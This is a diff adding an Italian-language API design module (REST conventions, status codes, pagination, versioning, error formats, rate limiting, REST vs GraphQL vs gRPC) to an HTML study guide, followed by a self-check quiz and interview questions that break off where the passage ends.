@@ -538,6 +538,30 @@
                 <a href="#modulo8-streams" class="nav-link nav-sublink">Java Streams</a>
                 <a href="#modulo8-comparison" class="nav-link nav-sublink">OOP vs FP</a>
                 <a href="#modulo8-quiz" class="nav-link nav-sublink">Quiz</a>
+
+                <a href="#modulo9" class="nav-link"><span>9. API Design</span></a>
+                <a href="#modulo9-rest" class="nav-link nav-sublink">REST Best Practices</a>
+                <a href="#modulo9-versioning" class="nav-link nav-sublink">Versioning & Errors</a>
+                <a href="#modulo9-comparison" class="nav-link nav-sublink">REST vs GraphQL vs gRPC</a>
+                <a href="#modulo9-quiz" class="nav-link nav-sublink">Quiz</a>
+
+                <a href="#modulo10" class="nav-link"><span>10. Security</span></a>
+                <a href="#modulo10-owasp" class="nav-link nav-sublink">OWASP Top 10</a>
+                <a href="#modulo10-auth" class="nav-link nav-sublink">Authentication</a>
+                <a href="#modulo10-authorization" class="nav-link nav-sublink">Authorization</a>
+                <a href="#modulo10-quiz" class="nav-link nav-sublink">Quiz</a>
+
+                <a href="#modulo11" class="nav-link"><span>11. DDD & Clean Architecture</span></a>
+                <a href="#modulo11-ddd" class="nav-link nav-sublink">Domain Driven Design</a>
+                <a href="#modulo11-clean" class="nav-link nav-sublink">Clean Architecture</a>
+                <a href="#modulo11-cqrs" class="nav-link nav-sublink">Event Sourcing & CQRS</a>
+                <a href="#modulo11-quiz" class="nav-link nav-sublink">Quiz</a>
+
+                <a href="#modulo12" class="nav-link"><span>12. Data Structures</span></a>
+                <a href="#modulo12-trees" class="nav-link nav-sublink">Trees & Tries</a>
+                <a href="#modulo12-graphs" class="nav-link nav-sublink">Graphs</a>
+                <a href="#modulo12-heaps" class="nav-link nav-sublink">Heaps & Priority Queue</a>
+                <a href="#modulo12-quiz" class="nav-link nav-sublink">Quiz</a>
             </div>
         </nav>
 
@@ -8805,6 +8829,2350 @@ String result = switch (findUser("123")) {
                 </div>
             </section>
 
+            <!-- ==================== MODULO 9: API DESIGN ==================== -->
+
+            <header class="module-header" id="modulo9">
+                <span class="module-tag">Modulo 9</span>
+                <h1>API Design</h1>
+                <p>REST best practices, versioning, error handling e confronto con GraphQL e gRPC</p>
+            </header>
+
+            <!-- REST Best Practices Section -->
+            <section class="section" id="modulo9-rest">
+                <h2>REST API Best Practices</h2>
+
+                <p><strong>REST</strong> (Representational State Transfer) è lo stile architetturale più diffuso per le API web. Ma "fare REST" non significa solo usare HTTP: richiede seguire principi precisi per creare API intuitive, consistenti e manutenibili.</p>
+
+                <h3>Resource Naming Conventions</h3>
+
+                <p>In REST, le URL rappresentano <strong>risorse</strong> (sostantivi), non azioni (verbi). Le azioni sono espresse tramite HTTP methods.</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>❌ Sbagliato</th>
+                            <th>✅ Corretto</th>
+                            <th>Perché</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>/getUsers</code></td>
+                            <td><code>GET /users</code></td>
+                            <td>Il verbo è nell'HTTP method, non nell'URL</td>
+                        </tr>
+                        <tr>
+                            <td><code>/createUser</code></td>
+                            <td><code>POST /users</code></td>
+                            <td>POST implica creazione</td>
+                        </tr>
+                        <tr>
+                            <td><code>/user/123</code></td>
+                            <td><code>/users/123</code></td>
+                            <td>Collezioni al plurale, consistenza</td>
+                        </tr>
+                        <tr>
+                            <td><code>/users/123/getOrders</code></td>
+                            <td><code>GET /users/123/orders</code></td>
+                            <td>Risorse nested, niente verbi</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <pre><code class="language-yaml"># Struttura URL consistente
+GET    /users                    # Lista utenti
+POST   /users                    # Crea utente
+GET    /users/{id}               # Dettaglio utente
+PUT    /users/{id}               # Replace completo utente
+PATCH  /users/{id}               # Update parziale utente
+DELETE /users/{id}               # Elimina utente
+
+# Risorse nested (relazioni)
+GET    /users/{id}/orders        # Ordini di un utente
+POST   /users/{id}/orders        # Crea ordine per utente
+GET    /users/{id}/orders/{oid}  # Dettaglio ordine specifico
+
+# Azioni non-CRUD (quando necessario, usa verbi espliciti)
+POST   /users/{id}/activate      # Azione specifica
+POST   /orders/{id}/cancel       # Azione specifica</code></pre>
+
+                <h3>HTTP Methods e Semantica</h3>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Method</th>
+                            <th>Semantica</th>
+                            <th>Idempotent</th>
+                            <th>Safe</th>
+                            <th>Request Body</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><code>GET</code></td>
+                            <td>Leggi risorsa</td>
+                            <td>✅ Sì</td>
+                            <td>✅ Sì</td>
+                            <td>No</td>
+                        </tr>
+                        <tr>
+                            <td><code>POST</code></td>
+                            <td>Crea risorsa</td>
+                            <td>❌ No</td>
+                            <td>❌ No</td>
+                            <td>Sì</td>
+                        </tr>
+                        <tr>
+                            <td><code>PUT</code></td>
+                            <td>Replace completo</td>
+                            <td>✅ Sì</td>
+                            <td>❌ No</td>
+                            <td>Sì</td>
+                        </tr>
+                        <tr>
+                            <td><code>PATCH</code></td>
+                            <td>Update parziale</td>
+                            <td>❌ No*</td>
+                            <td>❌ No</td>
+                            <td>Sì</td>
+                        </tr>
+                        <tr>
+                            <td><code>DELETE</code></td>
+                            <td>Elimina risorsa</td>
+                            <td>✅ Sì</td>
+                            <td>❌ No</td>
+                            <td>No (raro)</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="info-box">
+                    <h4>Idempotency: Perché è Cruciale?</h4>
+                    <p>Un'operazione è <strong>idempotente</strong> se eseguirla più volte produce lo stesso risultato. È fondamentale per retry automatici e fault tolerance. GET, PUT, DELETE sono idempotenti: se la rete fallisce e il client riprova, non causa danni. POST non è idempotente: due POST creano due risorse. Per rendere POST idempotente, usa un <strong>idempotency key</strong> nell'header.</p>
+                </div>
+
+                <pre><code class="language-java">// Idempotency Key per POST - previene duplicati su retry
+// Client invia: X-Idempotency-Key: abc123-unique-id
+
+@PostMapping("/payments")
+public ResponseEntity&lt;Payment&gt; createPayment(
+        @RequestHeader("X-Idempotency-Key") String idempotencyKey,
+        @RequestBody PaymentRequest request) {
+
+    // Controlla se già processato
+    Optional&lt;Payment&gt; existing = paymentRepository.findByIdempotencyKey(idempotencyKey);
+    if (existing.isPresent()) {
+        return ResponseEntity.ok(existing.get());  // Ritorna risultato cached
+    }
+
+    // Processa nuovo pagamento
+    Payment payment = paymentService.process(request);
+    payment.setIdempotencyKey(idempotencyKey);
+    paymentRepository.save(payment);
+
+    return ResponseEntity.status(HttpStatus.CREATED).body(payment);
+}</code></pre>
+
+                <h3>HTTP Status Codes</h3>
+
+                <p>Usa i codici di stato corretti - il client deve poter capire l'esito dalla risposta HTTP senza parsare il body.</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Code</th>
+                            <th>Significato</th>
+                            <th>Quando Usarlo</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>200 OK</strong></td>
+                            <td>Successo generico</td>
+                            <td>GET, PUT, PATCH, DELETE con body</td>
+                        </tr>
+                        <tr>
+                            <td><strong>201 Created</strong></td>
+                            <td>Risorsa creata</td>
+                            <td>POST che crea, include Location header</td>
+                        </tr>
+                        <tr>
+                            <td><strong>204 No Content</strong></td>
+                            <td>Successo, nessun body</td>
+                            <td>DELETE, PUT/PATCH senza response body</td>
+                        </tr>
+                        <tr>
+                            <td><strong>400 Bad Request</strong></td>
+                            <td>Request malformata</td>
+                            <td>JSON invalido, validazione fallita</td>
+                        </tr>
+                        <tr>
+                            <td><strong>401 Unauthorized</strong></td>
+                            <td>Non autenticato</td>
+                            <td>Token mancante o invalido</td>
+                        </tr>
+                        <tr>
+                            <td><strong>403 Forbidden</strong></td>
+                            <td>Non autorizzato</td>
+                            <td>Autenticato ma senza permessi</td>
+                        </tr>
+                        <tr>
+                            <td><strong>404 Not Found</strong></td>
+                            <td>Risorsa non esiste</td>
+                            <td>GET/PUT/DELETE su ID inesistente</td>
+                        </tr>
+                        <tr>
+                            <td><strong>409 Conflict</strong></td>
+                            <td>Conflitto di stato</td>
+                            <td>Violazione unique constraint, optimistic lock</td>
+                        </tr>
+                        <tr>
+                            <td><strong>422 Unprocessable</strong></td>
+                            <td>Semanticamente errato</td>
+                            <td>JSON valido ma dati non processabili</td>
+                        </tr>
+                        <tr>
+                            <td><strong>429 Too Many Requests</strong></td>
+                            <td>Rate limit superato</td>
+                            <td>Include Retry-After header</td>
+                        </tr>
+                        <tr>
+                            <td><strong>500 Internal Error</strong></td>
+                            <td>Errore server</td>
+                            <td>Bug non gestito (evitare!)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>503 Service Unavailable</strong></td>
+                            <td>Temporaneamente down</td>
+                            <td>Manutenzione, overload</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>Pagination</h3>
+
+                <p>Per collezioni grandi, la pagination è obbligatoria. Due approcci principali:</p>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                        PAGINATION STRATEGIES                                 │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  OFFSET-BASED (tradizionale)                                                │
+│  ────────────────────────────                                                │
+│  GET /users?page=3&size=20                                                  │
+│                                                                              │
+│  Pro: ✓ Semplice, ✓ Salta a pagina specifica                                │
+│  Contro: ✗ Inconsistenze se dati cambiano, ✗ Lento su offset grandi        │
+│          (DB deve scorrere N righe per OFFSET N)                            │
+│                                                                              │
+│  ─────────────────────────────────────────────────────────────────────────  │
+│                                                                              │
+│  CURSOR-BASED (consigliato per feed/timeline)                               │
+│  ──────────────────────────────────────────────                              │
+│  GET /users?cursor=eyJpZCI6MTIzfQ&limit=20                                  │
+│                                                                              │
+│  Pro: ✓ Consistente, ✓ Performante (usa indice)                             │
+│  Contro: ✗ No "vai a pagina X", ✗ Solo avanti/indietro                      │
+│                                                                              │
+│  Il cursor è tipicamente un ID encoded (base64) o un timestamp              │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+
+                <pre><code class="language-java">// Offset-based pagination response
+{
+  "data": [...],
+  "pagination": {
+    "page": 3,
+    "size": 20,
+    "totalElements": 1250,
+    "totalPages": 63
+  }
+}
+
+// Cursor-based pagination response
+{
+  "data": [...],
+  "pagination": {
+    "nextCursor": "eyJpZCI6MTQzLCJjcmVhdGVkQXQiOiIyMDI2LTAxLTI4In0=",
+    "prevCursor": "eyJpZCI6MTIzLCJjcmVhdGVkQXQiOiIyMDI2LTAxLTI3In0=",
+    "hasMore": true
+  }
+}</code></pre>
+
+                <h3>Filtering, Sorting, Searching</h3>
+
+                <pre><code class="language-yaml"># Filtering - query params per campo
+GET /products?category=electronics&minPrice=100&maxPrice=500&inStock=true
+
+# Sorting - campo e direzione
+GET /products?sort=price:asc
+GET /products?sort=createdAt:desc,name:asc    # Multi-sort
+
+# Searching - full-text search
+GET /products?q=wireless+headphones
+
+# Field selection (sparse fieldsets) - riduce payload
+GET /users/123?fields=id,name,email
+
+# Combinazione
+GET /products?category=electronics&q=sony&sort=price:asc&page=1&size=20</code></pre>
+
+                <h3>HATEOAS (Hypermedia)</h3>
+
+                <p><strong>HATEOAS</strong> (Hypermedia As The Engine Of Application State) è il livello più alto di REST maturity. Le response includono link alle azioni disponibili, rendendo l'API auto-documentante e navigabile.</p>
+
+                <pre><code class="language-json">{
+  "id": 123,
+  "status": "PENDING",
+  "total": 99.99,
+  "customer": {
+    "id": 456,
+    "name": "Alice"
+  },
+  "_links": {
+    "self": { "href": "/orders/123" },
+    "customer": { "href": "/users/456" },
+    "items": { "href": "/orders/123/items" },
+    "cancel": { "href": "/orders/123/cancel", "method": "POST" },
+    "pay": { "href": "/orders/123/pay", "method": "POST" }
+  }
+}</code></pre>
+
+                <div class="info-box">
+                    <h4>HATEOAS: Usarlo o No?</h4>
+                    <p>In pratica, HATEOAS completo è raramente implementato. Il valore principale è per API pubbliche dove i client non dovrebbero hardcodare URL. Per API interne o con client controllati, spesso l'overhead non vale il beneficio. Un compromesso comune è includere solo i link essenziali (self, next/prev per pagination).</p>
+                </div>
+            </section>
+
+            <!-- Versioning & Error Handling Section -->
+            <section class="section" id="modulo9-versioning">
+                <h2>Versioning, Error Handling e Rate Limiting</h2>
+
+                <h3>API Versioning Strategies</h3>
+
+                <p>Le API evolvono. Il versioning permette di introdurre breaking changes senza rompere i client esistenti.</p>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Strategia</th>
+                            <th>Esempio</th>
+                            <th>Pro</th>
+                            <th>Contro</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>URL Path</strong></td>
+                            <td><code>/api/v1/users</code></td>
+                            <td>Visibile, facile da capire, cacheable</td>
+                            <td>URL "brutti", viola REST purity</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Query Param</strong></td>
+                            <td><code>/users?version=1</code></td>
+                            <td>Semplice, flessibile</td>
+                            <td>Facile da dimenticare, caching complesso</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Header</strong></td>
+                            <td><code>Accept: application/vnd.api+json;v=1</code></td>
+                            <td>URL pulite, REST-compliant</td>
+                            <td>Meno visibile, difficile da testare</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Content Negotiation</strong></td>
+                            <td><code>Accept: application/vnd.company.v1+json</code></td>
+                            <td>Semanticamente corretto</td>
+                            <td>Complesso, poco usato</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <div class="info-box success">
+                    <h4>Raccomandazione Pratica</h4>
+                    <p><strong>URL Path versioning</strong> (<code>/api/v1/</code>) è il più diffuso e pragmatico. È visibile, facile da documentare, e i client sanno subito quale versione usano. Usa major version only (v1, v2) - non v1.2.3. Mantieni la versione precedente per un periodo di deprecation (6-12 mesi) prima di rimuoverla.</p>
+                </div>
+
+                <h3>Error Handling Standardizzato</h3>
+
+                <p>Un formato errori consistente è fondamentale per developer experience. RFC 7807 (Problem Details for HTTP APIs) è lo standard emergente.</p>
+
+                <pre><code class="language-json">// RFC 7807 Problem Details format
+{
+  "type": "https://api.example.com/errors/validation-error",
+  "title": "Validation Error",
+  "status": 400,
+  "detail": "The request contains invalid fields",
+  "instance": "/users/registration",
+  "timestamp": "2026-01-28T10:30:00Z",
+  "traceId": "abc123-def456",
+  "errors": [
+    {
+      "field": "email",
+      "code": "INVALID_FORMAT",
+      "message": "Must be a valid email address"
+    },
+    {
+      "field": "password",
+      "code": "TOO_SHORT",
+      "message": "Must be at least 8 characters"
+    }
+  ]
+}</code></pre>
+
+                <pre><code class="language-java">// Spring Boot: Global Exception Handler
+@RestControllerAdvice
+public class GlobalExceptionHandler {
+
+    @ExceptionHandler(MethodArgumentNotValidException.class)
+    public ResponseEntity&lt;ProblemDetail&gt; handleValidation(
+            MethodArgumentNotValidException ex,
+            HttpServletRequest request) {
+
+        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.BAD_REQUEST);
+        problem.setType(URI.create("https://api.example.com/errors/validation"));
+        problem.setTitle("Validation Error");
+        problem.setDetail("The request contains invalid fields");
+        problem.setInstance(URI.create(request.getRequestURI()));
+
+        List&lt;FieldError&gt; fieldErrors = ex.getBindingResult().getFieldErrors()
+            .stream()
+            .map(e -> new FieldError(e.getField(), e.getCode(), e.getDefaultMessage()))
+            .toList();
+
+        problem.setProperty("errors", fieldErrors);
+        problem.setProperty("traceId", MDC.get("traceId"));
+
+        return ResponseEntity.badRequest().body(problem);
+    }
+
+    @ExceptionHandler(ResourceNotFoundException.class)
+    public ResponseEntity&lt;ProblemDetail&gt; handleNotFound(ResourceNotFoundException ex) {
+        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.NOT_FOUND);
+        problem.setTitle("Resource Not Found");
+        problem.setDetail(ex.getMessage());
+        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(problem);
+    }
+
+    @ExceptionHandler(Exception.class)
+    public ResponseEntity&lt;ProblemDetail&gt; handleGeneric(Exception ex) {
+        log.error("Unhandled exception", ex);
+
+        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.INTERNAL_SERVER_ERROR);
+        problem.setTitle("Internal Server Error");
+        problem.setDetail("An unexpected error occurred");  // Non esporre dettagli interni!
+
+        return ResponseEntity.internalServerError().body(problem);
+    }
+}</code></pre>
+
+                <h3>Rate Limiting</h3>
+
+                <p>Il <strong>rate limiting</strong> protegge l'API da abusi e garantisce fair usage. Comunica sempre i limiti al client tramite headers.</p>
+
+                <pre><code class="language-yaml"># Response headers per rate limiting
+X-RateLimit-Limit: 1000           # Richieste permesse per window
+X-RateLimit-Remaining: 847        # Richieste rimanenti
+X-RateLimit-Reset: 1706439600     # Unix timestamp reset window
+
+# Quando limite superato: 429 Too Many Requests
+HTTP/1.1 429 Too Many Requests
+Retry-After: 60                   # Secondi da aspettare
+X-RateLimit-Limit: 1000
+X-RateLimit-Remaining: 0
+
+{
+  "type": "https://api.example.com/errors/rate-limit",
+  "title": "Rate Limit Exceeded",
+  "status": 429,
+  "detail": "You have exceeded the rate limit of 1000 requests per hour"
+}</code></pre>
+
+                <div class="info-box">
+                    <h4>Strategie di Rate Limiting</h4>
+                    <ul>
+                        <li><strong>Fixed Window</strong>: N richieste per minuto/ora. Semplice, ma burst al confine dei window.</li>
+                        <li><strong>Sliding Window</strong>: Conta richieste negli ultimi N secondi. Più smooth, più complesso.</li>
+                        <li><strong>Token Bucket</strong>: Token aggiunti costantemente, consumati per richiesta. Permette burst controllati.</li>
+                        <li><strong>Per-endpoint</strong>: Limiti diversi per endpoint (es. login più restrittivo).</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- REST vs GraphQL vs gRPC Section -->
+            <section class="section" id="modulo9-comparison">
+                <h2>REST vs GraphQL vs gRPC</h2>
+
+                <p>REST non è l'unica opzione. GraphQL e gRPC risolvono problemi specifici dove REST mostra limiti.</p>
+
+                <h3>Confronto ad Alto Livello</h3>
+
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Aspetto</th>
+                            <th>REST</th>
+                            <th>GraphQL</th>
+                            <th>gRPC</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Paradigma</strong></td>
+                            <td>Resource-based</td>
+                            <td>Query language</td>
+                            <td>RPC (Remote Procedure Call)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Protocollo</strong></td>
+                            <td>HTTP/1.1, HTTP/2</td>
+                            <td>HTTP (tipicamente POST)</td>
+                            <td>HTTP/2</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Formato dati</strong></td>
+                            <td>JSON (tipicamente)</td>
+                            <td>JSON</td>
+                            <td>Protocol Buffers (binario)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Schema/Contract</strong></td>
+                            <td>OpenAPI (opzionale)</td>
+                            <td>Schema GraphQL (obbligatorio)</td>
+                            <td>.proto files (obbligatorio)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Over/Under-fetching</strong></td>
+                            <td>Comune problema</td>
+                            <td>Risolto (client sceglie campi)</td>
+                            <td>Definito nel proto</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Caching</strong></td>
+                            <td>HTTP caching nativo</td>
+                            <td>Complesso (tutto è POST)</td>
+                            <td>Manuale</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Performance</strong></td>
+                            <td>Buona</td>
+                            <td>Variabile (query N+1)</td>
+                            <td>Eccellente (binario, HTTP/2)</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Learning curve</strong></td>
+                            <td>Bassa</td>
+                            <td>Media</td>
+                            <td>Alta</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+                <h3>GraphQL: Quando Usarlo</h3>
+
+                <pre><code class="language-graphql"># Il client richiede esattamente i campi che serve
+query {
+  user(id: "123") {
+    name
+    email
+    orders(last: 5) {
+      id
+      total
+      items {
+        productName
+        quantity
+      }
+    }
+  }
+}
+
+# Una singola richiesta invece di:
+# GET /users/123
+# GET /users/123/orders?limit=5
+# GET /orders/1/items
+# GET /orders/2/items
+# ...</code></pre>
+
+                <div class="info-box success">
+                    <h4>GraphQL: Pro e Contro</h4>
+                    <p><strong>Pro</strong>: Niente over/under-fetching, single endpoint, strongly typed, ottimo per UI complesse con dati nested, introspection built-in.</p>
+                    <p><strong>Contro</strong>: Caching HTTP non funziona, rischio query N+1 sul server (richiede DataLoader), complessità schema, difficile rate limiting per query.</p>
+                    <p><strong>Usa quando</strong>: Frontend complessi (mobile app, SPA), dati altamente relazionali, client diversi con bisogni diversi, team frontend/backend separati.</p>
+                </div>
+
+                <h3>gRPC: Quando Usarlo</h3>
+
+                <pre><code class="language-yaml"># user.proto - definizione del servizio
+syntax = "proto3";
+
+package user;
+
+service UserService {
+  rpc GetUser(GetUserRequest) returns (User);
+  rpc ListUsers(ListUsersRequest) returns (stream User);  // Streaming!
+  rpc CreateUser(CreateUserRequest) returns (User);
+}
+
+message User {
+  string id = 1;
+  string name = 2;
+  string email = 3;
+  repeated Order orders = 4;
+}
+
+message GetUserRequest {
+  string id = 1;
+}
+
+message Order {
+  string id = 1;
+  double total = 2;
+}</code></pre>
+
+                <div class="info-box">
+                    <h4>gRPC: Pro e Contro</h4>
+                    <p><strong>Pro</strong>: Performance eccellente (binario, compatto), streaming bidirezionale, code generation automatica, contract-first, ideale per microservizi interni.</p>
+                    <p><strong>Contro</strong>: Non leggibile da umani (binario), browser support limitato (richiede gRPC-Web), debugging più difficile, meno tooling rispetto a REST.</p>
+                    <p><strong>Usa quando</strong>: Comunicazione microservizi interna, alta performance richiesta, streaming real-time, polyglot systems (genera client per qualsiasi linguaggio).</p>
+                </div>
+
+                <h3>Decision Matrix</h3>
+
+                <div class="diagram">
+                    <pre>
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    QUANDO USARE COSA                                         │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  USA REST QUANDO:                                                           │
+│  • API pubblica (developer-friendly, standard)                              │
+│  • Caching HTTP importante                                                  │
+│  • CRUD semplice                                                            │
+│  • Team ha già esperienza REST                                              │
+│                                                                              │
+│  USA GRAPHQL QUANDO:                                                        │
+│  • Frontend complesso con dati nested                                       │
+│  • Mobile app (bandwidth limitata, no over-fetching)                        │
+│  • Client diversi con bisogni diversi                                       │
+│  • Rapid iteration su API                                                   │
+│                                                                              │
+│  USA GRPC QUANDO:                                                           │
+│  • Microservizi interni (non browser)                                       │
+│  • Performance critica                                                      │
+│  • Streaming real-time                                                      │
+│  • Team polyglot (Java, Go, Python, etc.)                                   │
+│                                                                              │
+│  COMBINA (comune in architetture reali):                                    │
+│  • REST/GraphQL per client esterni (browser, mobile)                        │
+│  • gRPC per comunicazione interna tra servizi                               │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘
+                    </pre>
+                </div>
+            </section>
+
+            <!-- Quiz Section Modulo 9 -->
+            <section class="quiz-section" id="modulo9-quiz">
+                <h2>Interactive Challenge Quiz - Modulo 9</h2>
+                <p>Verifica la tua comprensione dell'API Design.</p>
+
+                <!-- Question 41 -->
+                <div class="quiz-question" data-correct="b">
+                    <h4><span>Q1.</span> Un client fa POST /orders due volte a causa di un network timeout. Entrambe le richieste arrivano al server. Cosa succede senza idempotency key?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q41" id="q41a" value="a">
+                            <label for="q41a">Il server rileva automaticamente il duplicato e lo ignora</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q41" id="q41b" value="b">
+                            <label for="q41b">Vengono creati due ordini identici (duplicato)</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q41" id="q41c" value="c">
+                            <label for="q41c">La seconda richiesta riceve 409 Conflict</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q41" id="q41d" value="d">
+                            <label for="q41d">HTTP garantisce at-most-once delivery</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q41')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q41"></div>
+                </div>
+
+                <!-- Question 42 -->
+                <div class="quiz-question" data-correct="c">
+                    <h4><span>Q2.</span> Stai progettando un'API per un feed social (timeline infinita). Quale pagination strategy è più appropriata?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q42" id="q42a" value="a">
+                            <label for="q42a">Offset-based: GET /posts?page=5&size=20</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q42" id="q42b" value="b">
+                            <label for="q42b">Nessuna pagination: carica tutto e filtra client-side</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q42" id="q42c" value="c">
+                            <label for="q42c">Cursor-based: GET /posts?after=cursor123&limit=20</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q42" id="q42d" value="d">
+                            <label for="q42d">Random sampling: ritorna 20 post casuali</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q42')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q42"></div>
+                </div>
+
+                <!-- Question 43 -->
+                <div class="quiz-question" data-correct="a">
+                    <h4><span>Q3.</span> Un utente autenticato cerca di accedere a una risorsa di un altro utente. Quale status code è corretto?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q43" id="q43a" value="a">
+                            <label for="q43a">403 Forbidden</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q43" id="q43b" value="b">
+                            <label for="q43b">401 Unauthorized</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q43" id="q43c" value="c">
+                            <label for="q43c">404 Not Found</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q43" id="q43d" value="d">
+                            <label for="q43d">400 Bad Request</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q43')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q43"></div>
+                </div>
+
+                <!-- Question 44 -->
+                <div class="quiz-question" data-correct="d">
+                    <h4><span>Q4.</span> Perché il caching HTTP standard non funziona bene con GraphQL?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q44" id="q44a" value="a">
+                            <label for="q44a">GraphQL usa un formato binario incompatibile</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q44" id="q44b" value="b">
+                            <label for="q44b">Le response GraphQL sono sempre dinamiche</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q44" id="q44c" value="c">
+                            <label for="q44c">GraphQL non supporta HTTP headers</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q44" id="q44d" value="d">
+                            <label for="q44d">GraphQL usa sempre POST su un singolo endpoint, perdendo URL-based cache keys</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q44')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q44"></div>
+                </div>
+
+                <!-- Question 45 -->
+                <div class="quiz-question" data-correct="b">
+                    <h4><span>Q5.</span> Devi scegliere tra REST e gRPC per la comunicazione tra due microservizi interni ad alta frequenza (10K req/sec). Quale scegli e perché?</h4>
+                    <div class="quiz-options">
+                        <div class="quiz-option" data-value="a">
+                            <input type="radio" name="q45" id="q45a" value="a">
+                            <label for="q45a">REST: più standard e facile da debuggare con curl</label>
+                        </div>
+                        <div class="quiz-option" data-value="b">
+                            <input type="radio" name="q45" id="q45b" value="b">
+                            <label for="q45b">gRPC: protobuf binario più efficiente, HTTP/2 multiplexing, code generation</label>
+                        </div>
+                        <div class="quiz-option" data-value="c">
+                            <input type="radio" name="q45" id="q45c" value="c">
+                            <label for="q45c">GraphQL: flessibilità nelle query tra servizi</label>
+                        </div>
+                        <div class="quiz-option" data-value="d">
+                            <input type="radio" name="q45" id="q45d" value="d">
+                            <label for="q45d">WebSocket: connessione persistente più efficiente</label>
+                        </div>
+                    </div>
+                    <button class="check-btn" onclick="checkAnswer('q45')">Verifica Risposta</button>
+                    <div class="feedback" id="feedback-q45"></div>
+                </div>
+            </section>
+
+            <!-- Questions Section Modulo 9 -->
+            <section class="section" id="modulo9-questions">
+                <h2>Domande da Colloquio - Modulo 9</h2>
+
+                <div class="info-box">
+                    <h4>Q: Come gestisci il versioning delle API? Quale strategia preferisci?</h4>
+                    <p><strong>Risposta attesa:</strong> Preferisco URL path versioning (/api/v1/, /api/v2/) perché è esplicito, facile da documentare, e non richiede header speciali. Uso solo major version - minor changes sono backwards compatible. Quando introduco v2, mantengo v1 in deprecation per 6-12 mesi con header X-Deprecated e documentazione della timeline. Per evitare breaking changes, aggiungo campi (non rimuovo), uso nullable per nuovi campi required, e faccio expand/contract per rinominare.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Spiega la differenza tra PUT e PATCH. Quando usi quale?</h4>
+                    <p><strong>Risposta attesa:</strong> PUT è un replace completo: il client invia la rappresentazione INTERA della risorsa, e il server la sostituisce. Se ometti un campo, viene rimosso/nullato. È idempotente. PATCH è un update parziale: invii solo i campi da modificare. I campi omessi restano invariati. Non è necessariamente idempotente (dipende dalla semantica). Uso PUT quando il client ha la visione completa della risorsa. Uso PATCH per update chirurgici (es. cambiare solo lo status di un ordine) o quando la risorsa è grande e modifico poco.</p>
+                </div>
+
+                <div class="info-box">
+                    <h4>Q: Come implementeresti rate limiting per un'API?</h4>
